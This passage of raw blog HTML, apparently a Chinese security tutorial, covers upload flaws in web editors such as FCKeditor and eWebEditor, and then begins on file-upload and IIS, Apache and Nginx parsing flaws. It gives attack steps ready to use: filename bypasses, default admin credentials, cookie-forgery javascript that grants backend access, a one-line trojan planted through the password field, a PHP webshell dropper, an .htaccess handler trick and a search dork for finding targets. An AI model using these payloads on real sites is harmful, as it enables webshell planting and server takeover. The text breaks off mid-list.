class="line">fckeditor//editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fckeditor//editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/php/connector.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fckeditor//editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=../../connectors/php/connector.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fckeditor//editor/filemanager/connectors/php/connector.php?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php (ver:2.6.3 测试通过)</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>Fckeditor 2.0 &lt;&#x3D; 2.2允许上传asa、cer、php2、php4、inc、pwml、pht后缀的文件</li></ul><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2><ul><li>FCKeditor v2.4.3中File类别默认拒绝上传类型：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">html|htm|php|php2|php3|php4|php5|phtml|pwml|inc|asp|aspx|ascx|jsp|cfm|cfc| </span><br><span class="line">　　pl|bat|exe|com|dll|vbs|js|reg|cgi|htaccess|asis|sh|shtml|shtm|phtm </span><br></pre></td></tr></table></figure></li></ul><hr><ul><li>windows有任意文件上传漏洞如x.asp;.jpg<br>Apache+linux 环境下在上传文件后面加个.突破！测试通过。<h3 id="Version-lt-x3D-2-4-2-For-php"><a href="#Version-lt-x3D-2-4-2-For-php" class="headerlink" title="Version &lt;&#x3D;2.4.2 For php"></a>Version &lt;&#x3D;2.4.2 For php</h3>在处理PHP 上传的地方并未对Media 类型进行上传文件类型的控制，导致用户上传任意文件！将以下保存为html文件，修改action地址。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=&quot;frmUpload&quot; enctype=&quot;multipart/form-data&quot;</span><br><span class="line">action=&quot;http://www.site.com/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot; method=&quot;post&quot;&gt;Upload a new file:&lt;br&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;NewFile&quot; size=&quot;50&quot;&gt;&lt;br&gt;</span><br><span class="line">&lt;input id=&quot;btnUpload&quot; type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><h2 id="低于fck-2-5版本利用"><a href="#低于fck-2-5版本利用" class="headerlink" title="低于fck 2.5版本利用"></a>低于fck 2.5版本利用</h2></li></ul><p>看网站容器是否是IIS 6.0 ，利用解析漏洞<br>可以上传下 x.asa&#x2F;cer&#x2F;cdx 或者 x.jpg;.cer&#x2F;x.jpg;asa<br>利用目录解析漏洞<br>创建一个x.asp 目录 上传图片马即可</p><p>利用00截断漏洞<br>x.asp%00jpg</p><h2 id="FCKeditor-文件上传“-”变“-”下划线的绕过方法"><a href="#FCKeditor-文件上传“-”变“-”下划线的绕过方法" class="headerlink" title="FCKeditor 文件上传“.”变“_”下划线的绕过方法"></a>FCKeditor 文件上传“.”变“_”下划线的绕过方法</h2><ul><li>fckeditor 2.5  文件上传“.”变“_”下划线的绕过方法</li><li>很多时候上传的文件例如：shell.php.rar 或shell.php;.jpg 会变为shell_php;.jpg 这是新版FCK 的变化。</li><li>突破方法：</li></ul><ol><li>二次上传</li><li>a.asp%00.jpg  00截断利用</li><li>使用特殊名称绕过<br>a.aspx.a;.a.aspx.jpg..jpg.aspx<br>xx.asp.;.jpg</li><li>递归创建a.asp目录配合解析漏洞</li><li>FCKeditor_2.5&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;CreateFolder&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F;xx.asp&amp;NewFolderName&#x3D;x.asp</li></ol><h2 id="fckeditor-2-6-3-php版本利用"><a href="#fckeditor-2-6-3-php版本利用" class="headerlink" title="fckeditor 2.6.3 php版本利用"></a>fckeditor 2.6.3 php版本利用</h2><p>上传页面地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php</span><br></pre></td></tr></table></figure><p>转包在url中00截断</p><h2 id="FCK编辑器jsp版本漏洞："><a href="#FCK编辑器jsp版本漏洞：" class="headerlink" title="FCK编辑器jsp版本漏洞："></a>FCK编辑器jsp版本漏洞：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&amp;Type=Image&amp;CurrentFolder=%2F</span><br></pre></td></tr></table></figure><p>上传马所在目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span><br></pre></td></tr></table></figure><p>上传shell的地址:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector</span><br></pre></td></tr></table></figure><h1 id="EWEB编辑器漏洞"><a href="#EWEB编辑器漏洞" class="headerlink" title="EWEB编辑器漏洞"></a>EWEB编辑器漏洞</h1><h2 id="eweb编辑器利用流程"><a href="#eweb编辑器利用流程" class="headerlink" title="eweb编辑器利用流程"></a>eweb编辑器利用流程</h2><ol><li>查找eweb编辑器路径，找eweb管理后台</li><li>进入后台，修改上传文件类型</li><li>上传脚本拿shell</li><li>如果没有后台<ol><li>看是否能下载数据库，看数据库中有没有可以上传脚本的样式，构造上传</li><li>利用eweb目录遍历漏洞，找到网站数据库，下载破解管理员密码进后台拿shell</li><li>查找对用编辑器版本漏洞利用拿shell</li></ol></li></ol><h2 id="eWebEditor利用基础知识"><a href="#eWebEditor利用基础知识" class="headerlink" title="eWebEditor利用基础知识"></a>eWebEditor利用基础知识</h2><ul><li>默认后台地址：&#x2F;ewebeditor&#x2F;admin_login.asp <br>　　建议最好检测下admin_style.asp文件是否可以直接访问 <br>　　默认数据库路径：[PATH]&#x2F;db&#x2F;ewebeditor.mdb <br>　　[PATH]&#x2F;db&#x2F;db.mdb – 某些CMS里是这个数据库 <br>　　也可尝试 [PATH]&#x2F;db&#x2F;%23ewebeditor.mdb – 某些管理员自作聪明的小伎俩</li><li>使用默认密码：admin&#x2F;admin888 或 admin&#x2F;admin 进入后台，也可尝试 admin&#x2F;123456 (有些管理员以及一些CMS，就是这么设置的) <h2 id="有修改权限的利用"><a href="#有修改权限的利用" class="headerlink" title="有修改权限的利用"></a>有修改权限的利用</h2></li><li>通过增加样式–设置-添加插入图片-getshell</li><li>不能添加工具栏，但设定好了某样式中的文件类型</li><li>修改action字段</li><li>比如 ID&#x3D;46 s-name &#x3D;standard1 <ul><li>构造 代码: ewebeditor.asp?id&#x3D;content&amp;style&#x3D;standard </li><li>ID和和样式名改过后 </li><li>ewebeditor.asp?id&#x3D;46&amp;style&#x3D;standard1 </li><li>eWebEditor遍历目录漏洞<h2 id="无修改权限"><a href="#无修改权限" class="headerlink" title="无修改权限"></a>无修改权限</h2></li></ul></li></ul><p>通过目录遍历:<br><a href="http://www.webshell.com/admin/editor/admin_uploadfile.asp?id=&amp;dir=">http://www.webshell.com/admin/editor/admin_uploadfile.asp?id=&amp;dir=</a>..<br>ewebeditor&#x2F;admin_uploadfile.asp?id&#x3D;14<br>在id&#x3D;14后面添加&amp;dir&#x3D;..<br>再加 &amp;dir&#x3D;..&#x2F;..<br>&amp;dir&#x3D;<a href="http://www.****.com/">http://www.****.com/../</a>.. 看到整个网站文件了  </p><h2 id="eWebEditor-5-2-列目录漏洞"><a href="#eWebEditor-5-2-列目录漏洞" class="headerlink" title="eWebEditor 5.2 列目录漏洞"></a>eWebEditor 5.2 列目录漏洞</h2><p>　ewebeditor&#x2F;asp&#x2F;browse.asp <br>　　过滤不严，造成遍历目录漏洞 <br><a href="http://www.xxxx.com/ewebeditor/asp/browse.asp?style=standard650&amp;dir=%E2%80%A6././/">http://www.xxxx.com/ewebeditor/asp/browse.asp?style=standard650&amp;dir=…././/</a>.. <br>　　利用WebEditor session欺骗漏洞,进入后台 </p><h2 id="eWebEditor-2-7-0-注入漏洞"><a href="#eWebEditor-2-7-0-注入漏洞" class="headerlink" title="eWebEditor 2.7.0 注入漏洞"></a>eWebEditor 2.7.0 注入漏洞</h2><p><a href="http://www.xxxx.com/ewebeditor/ewebeditor.asp?id=article_content&amp;style=full_v200">http://www.xxxx.com/ewebeditor/ewebeditor.asp?id=article_content&amp;style=full_v200</a> </p><p>默认表名：eWebEditor_System默认列名：sys_UserName、sys_UserPass，然后利用nbsi进行猜解. </p><h2 id="eWebEditor2-8-0最终版删除任意文件漏洞"><a href="#eWebEditor2-8-0最终版删除任意文件漏洞" class="headerlink" title="eWebEditor2.8.0最终版删除任意文件漏洞"></a>eWebEditor2.8.0最终版删除任意文件漏洞</h2><p>此漏洞存在于Example\NewsSystem目录下的delete.asp文件中，这是ewebeditor的测试页面，无须登陆可以直接进入。 <br>攻击利用: (请修改action字段为指定网址) <br>Del Files.html </p><h2 id="eWebEditor-PHP-x2F-ASP…后台通杀漏洞"><a href="#eWebEditor-PHP-x2F-ASP…后台通杀漏洞" class="headerlink" title="eWebEditor PHP&#x2F;ASP…后台通杀漏洞"></a>eWebEditor PHP&#x2F;ASP…后台通杀漏洞</h2><p>影响版本: PHP ≥ 3.0~3.8与asp 2.8版也通用，或许低版本也可以，有待测试。 </p><p>　　攻击利用: </p><p>进入后台&#x2F;eWebEditor&#x2F;admin&#x2F;login.php,随便输入一个用户和密码,会提示出错了. <br>　　这时候你清空浏览器的url,然后输入 <br>　　javascript:alert(document.cookie&#x3D;”adminuser&#x3D;”+escape(“admin”)); <br>　　javascript:alert(document.cookie&#x3D;”adminpass&#x3D;”+escape(“admin”)); <br>　　javascript:alert(document.cookie&#x3D;”admindj&#x3D;”+escape(“1”)); <br>　　而后三次回车,清空浏览器的URL,现在输入一些平常访问不到的文件如..&#x2F;ewebeditor&#x2F;admin&#x2F;default.php，就会直接进去。 </p><h2 id="eWebEditor-2-8-商业版插一句话木马"><a href="#eWebEditor-2-8-商业版插一句话木马" class="headerlink" title="eWebEditor 2.8 商业版插一句话木马"></a>eWebEditor 2.8 商业版插一句话木马</h2><p>登陆后台，点击修改密码—新密码设置为 1”:eval request(“h”)’ <br>设置成功后，访问asp&#x2F;config.asp文件即可，一句话木马被写入到这个文件里面了. </p><h2 id="eWebEditor"><a href="#eWebEditor" class="headerlink" title="eWebEditor"></a>eWebEditor</h2><p>下载数据库<br>查看可以上传脚本类型的样式<br>然后进行构造上传</p><h1 id="其他编辑器漏洞"><a href="#其他编辑器漏洞" class="headerlink" title="其他编辑器漏洞"></a>其他编辑器漏洞</h1><h2 id="CKFinder-任意文件上传漏洞"><a href="#CKFinder-任意文件上传漏洞" class="headerlink" title="CKFinder  任意文件上传漏洞"></a>CKFinder  任意文件上传漏洞</h2><p>CKFinder是国外一款非常流行的所见即所得文字编辑器,其1.4.3 asp.net版本存在任意文件上传漏洞，攻击者可以利用该漏洞上传任意文件。CKFinder在上传文件的时候,强制将文件名（不包括后缀）中点号等其他字符转为下划线_，但是在修改文件名时却没有任何限制，从而导致可以上传xxxx_php;1.jpg 等畸形文件名，最终导致文件上传漏洞。</p><ul><li>然后修改文件名</li><li>xxxx.php;1.jpg</li><li>利用iis6.0目录解析漏洞拿shell</li><li>创建目录&#x2F;x.asp&#x2F;</li><li>在目录下上传图片马即可拿shell<h2 id="南方数据编辑器southidceditor"><a href="#南方数据编辑器southidceditor" class="headerlink" title="南方数据编辑器southidceditor"></a>南方数据编辑器southidceditor</h2></li><li>首先登陆后台</li><li>利用编辑器上传:</li><li>访问admin&#x2F;southidceditor&#x2F;admin_style.asp</li><li>修改编辑器样式,增加asa(不要asp).然后直接后台编辑新闻上传.</li></ul><hr><p>通过upfile_other.asp漏洞文件直接取SHELL<br>直接打开userreg.asp进行注册会员，进行登录，（在未退出登录的状态下）使用双文件上传<br>此方法通杀南方数据、良精系统、网软天下等</p><p>在Upfile_Photo.asp文件中<br>只限制了对”asp”，”asa”,”aspx”类的文件上传，我们只要在”网站配置”的允许的上传文件类型处增加上传“cer“等被服务器可解析的文件类型就可</p><h2 id="UEDITOR"><a href="#UEDITOR" class="headerlink" title="UEDITOR"></a>UEDITOR</h2><p>利用II6.0文件名解析漏洞，上传图片改名为x.php;20160032342342.jpg获取shell</p><h2 id="DotNetTextBox编辑器漏洞"><a href="#DotNetTextBox编辑器漏洞" class="headerlink" title="DotNetTextBox编辑器漏洞"></a>DotNetTextBox编辑器漏洞</h2><ul><li>关键字：system_dntb&#x2F;</li><li>确定有 system_dntb&#x2F;uploadimg.aspx 并能打开，这时候是不能上传的，由于他是验证cookie来得出上传后的路径，这样我们可以用cookie欺骗工具。</li><li>cookie:UserType&#x3D;0; IsEdition&#x3D;0; Info&#x3D;1; uploadFolder&#x3D;..&#x2F;system_dntb&#x2F;Upload&#x2F;;</li><li>路径可以修改，只是权限够，上传后改名为1.asp;.jpg利用iis解析漏洞。</li></ul><hr><p>system_dntb&#x2F;advanced.aspx<br>用firebug将disabled&#x3D;”disabled’，value&#x3D;”jgp,gif,png”修改为enabled&#x3D;”enabled”,value&#x3D;”jpg,gif,png,aspx”，然后点更新成功按钮</p><h2 id="PHPWEB网站管理系统后台Kedit编辑器"><a href="#PHPWEB网站管理系统后台Kedit编辑器" class="headerlink" title="PHPWEB网站管理系统后台Kedit编辑器"></a>PHPWEB网站管理系统后台Kedit编辑器</h2><p>两种利用方式</p><ul><li>第一种是利用iis6.0文件名解析漏洞<br>xx.php;xx.jpg</li><li>第二种方式<br>%00阶段<br>xx.php%00jpg<h2 id="Cute-Editor在线编辑器本地包含漏洞"><a href="#Cute-Editor在线编辑器本地包含漏洞" class="headerlink" title="Cute Editor在线编辑器本地包含漏洞"></a>Cute Editor在线编辑器本地包含漏洞</h2>影响版本: <ul><li>CuteEditor For Net 6.4 </li><li>脆弱描述： </li><li>可以随意查看网站文件内容，危害较大。 </li><li>攻击利用: <br><a href="http://www.xxxx.com/CuteSoft_Client/CuteEditor/Load.ashx?type=image&amp;file=../../../web.config">http://www.xxxx.com/CuteSoft_Client/CuteEditor/Load.ashx?type=image&amp;file=../../../web.config</a></li></ul></li></ul><p> </p><h2 id="Cute-Editor-Asp-Net版利用iis解析漏洞获得权限"><a href="#Cute-Editor-Asp-Net版利用iis解析漏洞获得权限" class="headerlink" title="Cute Editor Asp.Net版利用iis解析漏洞获得权限"></a>Cute Editor Asp.Net版利用iis解析漏洞获得权限</h2><p>影响版本：<br>CuteEditor for ASP.NET中文版脆弱描述：<br>脆弱描述：<br>CuteEditor对上传文件名未重命名，导致其可利用IIS文件名解析Bug获得webshell权限。<br>攻击利用：<br>可通过在搜索引擎中键入关键字 inurl:Post.aspx?SmallClassID&#x3D; 来找到测试目标。<br>在编辑器中点击“多媒体插入”，上传一个名为“xxx.asp;.avi”的网马，以此获得权限。</p><h2 id="Webhtmleditor"><a href="#Webhtmleditor" class="headerlink" title="Webhtmleditor"></a>Webhtmleditor</h2><p>利用WIN 2003 IIS文件名称解析漏洞获得SHELL <br>对上传的图片或其他文件无重命名操作，导致允许恶意用户上传diy.asp;.jpg来绕过对后缀名审查的限制，对于此类因编辑器作者意识犯下的错误，就算遭遇缩略图，文件头检测，也可使用图片木马 插入一句话来突破。 </p><h2 id="Kindeditor"><a href="#Kindeditor" class="headerlink" title="Kindeditor"></a>Kindeditor</h2><p>利用WIN 2003 IIS文件名称解析漏洞获得SHELL <br>　　影响版本: &lt;&#x3D; kindeditor 3.2.1(09年8月份发布的最新版) <br>　　脆弱描述&#x2F;攻击利用： <br>　　upload&#x2F;2010&#x2F;3&#x2F;201003102334381513.jpg 大家可以前去围观。<br>xx.asp;x.jpg</p><p>##Freetextbox<br>    Freetextbox遍历目录漏洞 <br>　　影响版本：未知 <br>　　脆弱描述： <br>　　因为ftb.imagegallery.aspx代码中 只过滤了&#x2F;但是没有过滤\符号所以导致出现了遍历目录的问题。 <br>　　攻击利用: <br>　　在编辑器页面点图片会弹出一个框(抓包得到此地址)构造如下，可遍历目录。 <br>　　<a href="http://www.xxxx.com/Member/images/ftb/HelperScripts/ftb.imagegallery.aspx?frame=1&amp;rif=..&amp;cif=%5C">http://www.xxxx.com/Member/images/ftb/HelperScripts/ftb.imagegallery.aspx?frame=1&amp;rif=..&amp;cif=\</a>.. </p><h2 id="Freetextbox-Asp-Net版利用IIS解析漏洞获得权限"><a href="#Freetextbox-Asp-Net版利用IIS解析漏洞获得权限" class="headerlink" title="Freetextbox Asp.Net版利用IIS解析漏洞获得权限"></a>Freetextbox Asp.Net版利用IIS解析漏洞获得权限</h2><p>影响版本：所有版本<br>脆弱描述：<br>没做登陆验证可以直接访问上传木马<br>Freetextbox 3-3-1 可以直接上传任意格式的文件<br>Freetextbox 1.6.3 及其他版本可以上传 格式为x.asp;.jpg<br>攻击利用：<br>利用IIS解析漏洞拿SHELL。上传后SHELL的路径为<a href="http://xxxx.com/images/x.asp;.jpg">http://xxxx.com/images/x.asp;.jpg</a></p><h2 id="Msn-editor利用iis6-0解析漏洞"><a href="#Msn-editor利用iis6-0解析漏洞" class="headerlink" title="Msn editor利用iis6.0解析漏洞"></a>Msn editor利用iis6.0解析漏洞</h2><p>影响版本：未知<br>脆弱描述：<br>点击图片上传后会出现上传页面，地址为<br><a href="http://navisec.it/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=">http://navisec.it/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=</a><br>用普通的图片上传后，地址为<br><a href="http://navisec.it/news/uppic/41513102009204012_1.gif">http://navisec.it/news/uppic/41513102009204012_1.gif</a><br>记住这时候的路径，再点击图片的上传，这时候地址就变成了<br><a href="http://navisec.it/news/admin/uploadPic.asp?language=&amp;editImageNum=1&amp;editRemNum=41513102009204012">http://navisec.it/news/admin/uploadPic.asp?language=&amp;editImageNum=1&amp;editRemNum=41513102009204012</a><br>很明显。图片的地址是根据RemNum后面的编号生成的。<br>攻击利用:<br>配合IIS的解析漏洞，把RemNum后面的数据修改为1.asp;41513102009204012，变成下面这个地址<br><a href="http://navisec.it/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=1.asp;41513102009204012">http://navisec.it/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=1.asp;41513102009204012</a><br>然后在浏览器里打开，然后选择你的脚本木马上传，将会返回下面的地址<br>uppic&#x2F;1.asp;41513102009204012_2.gif<br>直接打开就是我们的小马地址！<br>附录</p>]]></content>
      
      
      
        <tags>
            
            <tag> 文本编辑器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/archives/592e5fba.html"/>
      <url>/archives/592e5fba.html</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>Wb应用程序通常会有文件上传的功能，例如，在BBS发布图片、在个人网站发布ZP压缩包、在招聘网站上发布DOC格式简历等。只要Wb应用程序允许上传文件，就有可能存在文件上传漏洞。<br>上传漏洞与SQL注射相比，其风险更大，如果Wb应用程序存在上传漏洞，攻击者甚至可以直接上传一个WebShell到服务器上。<br>那么如何确认Wb应用程序是否存在上传漏洞呢？比如：我的网站是一个BBS论坛，由PHP语言编写，用户可以上传自己的个性头像，也就是图片文件，但文件上传时并没有对图片格式做验证，导致用户可以上传任意文件，那么这就是一个上传漏洞。</p><h1 id="漏洞解析"><a href="#漏洞解析" class="headerlink" title="漏洞解析"></a>漏洞解析</h1><p>攻击者在利用上传漏洞时，通常会与Wb容器的解析漏洞配合在一起。<br>常见的Web容器有IS、Nginx、Apache、Tomcat等，下面将以IIS、Apache容器为例讲解。</p><hr><ol><li>上传文件和文件执行是两个东西</li><li>漏洞分类:解析漏洞、cms漏洞、其他漏洞【编辑器漏洞、cve漏洞、安全修复】</li></ol><hr><p>思路：<br>如果有一个网站，要从文件上传的方向开始<br>第一步：先看中间件，看是否存在解析漏洞&#x2F;CMS&#x2F;编辑器漏洞&#x2F;CVE&#x2F;<br>如果有，如何找：<br>        字典扫描：扫描会员中心，文件上传的位置<br>找到后，如何利用：<br>        验证&#x2F;绕过</p><h1 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h1><h2 id="IIS-5-x-x2F-6-0解析漏洞"><a href="#IIS-5-x-x2F-6-0解析漏洞" class="headerlink" title="IIS 5.x&#x2F;6.0解析漏洞"></a>IIS 5.x&#x2F;6.0解析漏洞</h2><p>IIS 6.0解析利用方法有两种</p><ol><li>目录解析<br>&#x2F;xx.asp&#x2F;xx.jpg</li></ol><p>在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。<br>例如创建目录 test1.asp，那么<br>&#x2F;test1.asp&#x2F;1.jpg<br>将被当作asp文件来执行。假设黑阔可以控制上传文件夹路径,就可以不管你上传后你的图片改不改名都能拿shell了</p><ol start="2"><li>文件解析<br>test1.asp;.jpg</li></ol><ul><li>第二种，在IIS6.0下，分号后面的不被解析，也就是说<br>test1.asp;.jpg 会被服务器看成是wooyun.asp还有IIS6.0 默认的可执行文件除了asp还包含这三种<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/test1.asa</span><br><span class="line">/test1.cer</span><br><span class="line">/test1.cdx</span><br></pre></td></tr></table></figure><h2 id="IIS-7-0-x2F-IIS-7-5-x2F-IIS8-0-x2F-8-5-x2F-10-0解析漏洞"><a href="#IIS-7-0-x2F-IIS-7-5-x2F-IIS8-0-x2F-8-5-x2F-10-0解析漏洞" class="headerlink" title="IIS 7.0&#x2F;IIS 7.5&#x2F;IIS8.0&#x2F;8.5 &#x2F;10.0解析漏洞"></a>IIS 7.0&#x2F;IIS 7.5&#x2F;IIS8.0&#x2F;8.5 &#x2F;10.0解析漏洞</h2></li></ul><p>在默认Fast-CGI开启状况下,上传一个名字为test2.jpg，内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PHP fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>的文件，然后访问test2.jpg&#x2F;.php,在这个目录下就会生成一句话木马 shell.php</p><p><a href="http://www.xxx.com/logo.gif/*.php">www.xxx.com/logo.gif/*.php</a> 触发漏洞（有漏洞会把前面文件当做php执行）</p><p>X.asp%00jieduan%jpg<br>a.aspx.a;.a.aspx.jpg..jpg 第二种解析漏洞或者直接上传 xx.asp</p><h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><p>Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断.<br>比如 test3.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把test3.php.owf.rar解析成php.<br>如何判断是不是合法的后缀就是这个漏洞的利用关键,测试时可以尝试上传一个test3.php.rara.jpg.png…（把你知道的常见后缀都写上…）去测试是否是合法后缀<br>任意不识别的后缀，逐级向上识别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.txt</span><br><span class="line">x.php.zzzz.xxxdf</span><br><span class="line">Phtml</span><br><span class="line">Php3</span><br><span class="line">Php4 </span><br><span class="line">php5</span><br><span class="line">X.phtml</span><br><span class="line">Php空格</span><br><span class="line">Php_</span><br><span class="line">PHP</span><br></pre></td></tr></table></figure><h3 id="htaccess文件解析"><a href="#htaccess文件解析" class="headerlink" title="htaccess文件解析"></a>htaccess文件解析</h3><p>如果在Apache中.htaccess可被执行.且可被上传.那可以尝试在.htaccess中写入: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch “*.jpg &quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>然后再上传shell.jpg的木马, 这样shell.jpg就可解析为php文件</p><h2 id="Nginx-空字节代码执行漏洞"><a href="#Nginx-空字节代码执行漏洞" class="headerlink" title="Nginx 空字节代码执行漏洞"></a>Nginx 空字节代码执行漏洞</h2><ul><li>影响版:0.5.,0.6., 0.7 &lt;&#x3D; 0.7.65, 0.8 &lt;&#x3D; 0.8.37</li><li>Nginx在图片中嵌入PHP代码然后通过访问<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.php%00.jpg</span><br></pre></td></tr></table></figure>来执行其中的代码</li></ul><h2 id="nginx畸形解析漏洞"><a href="#nginx畸形解析漏洞" class="headerlink" title="nginx畸形解析漏洞"></a>nginx畸形解析漏洞</h2><p>默认fast-cgi开启状况下，在一个文件路径后面加上&#x2F;xx.php会将原来的文件解析为php文件</p><p>将shell语句，如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PHP fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>写在文本xx.txt中(或者shell语句直接写一句话，用菜刀、cknife等直连，只是容易被查杀），然后用命令将shell语句附加在正常图片xx.jpg后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy xx.jpg/b + xx.txt/a test.jpg</span><br></pre></td></tr></table></figure><p>上传test.jpg，然后访问test.jpg&#x2F;.php或test.jpg&#x2F;abc.php当前目录下就会生成一句话木马 shell.php</p><h1 id="文件上传过程"><a href="#文件上传过程" class="headerlink" title="文件上传过程"></a>文件上传过程</h1><h2 id="上传检测流程概述"><a href="#上传检测流程概述" class="headerlink" title="上传检测流程概述"></a>上传检测流程概述</h2><ul><li>通常一个文件以 HTTP 协议进行上传时，将以 POST 请求发送至 web 服务器 web 服务器接收到请求后并同意后，用户与 web 服务器将建立连接，并传输 data<h2 id="文件上传的特征"><a href="#文件上传的特征" class="headerlink" title="文件上传的特征"></a>文件上传的特征</h2></li><li>从中获取特征为：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">请求Header中Content-Type存在以下特征：</span><br><span class="line">multipart/form-data（表示该请求是一个文件上传请求）</span><br><span class="line">存在boundary字符串（作用为分隔符，以区分POST数据）</span><br></pre></td></tr></table></figure></li><li>POST的内容存在以下特征：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition</span><br><span class="line">name</span><br><span class="line">filename</span><br><span class="line">POST中的boundary的值就是Content-Type的值在最前面加了两个--，除了最后标识结束的boundary</span><br><span class="line">最后标识结束的boundary最后默认会多出两个--（测试时，最后一行的boundary删掉也能成功上传）</span><br></pre></td></tr></table></figure></li></ul><h2 id="服务器命名规则"><a href="#服务器命名规则" class="headerlink" title="服务器命名规则"></a>服务器命名规则</h2><p>第一种类型：上传文件名和服务器命名一致<br>第二种类型：上传文件名和服务器命名不一致（随机，时间日期命名等）</p><h1 id="文件上传检测绕过"><a href="#文件上传检测绕过" class="headerlink" title="文件上传检测绕过"></a>文件上传检测绕过</h1><ol><li>客户端 javascript 检测 (通常为检测文件扩展名)</li><li>服务端 MIME 类型检测 (检测 Content-Type 内容)</li><li>服务端目录路径检测 (检测跟 path 参数相关的内容)</li><li>服务端文件扩展名检测 (检测跟文件 extension 相关的内容)</li><li>服务端文件内容检测 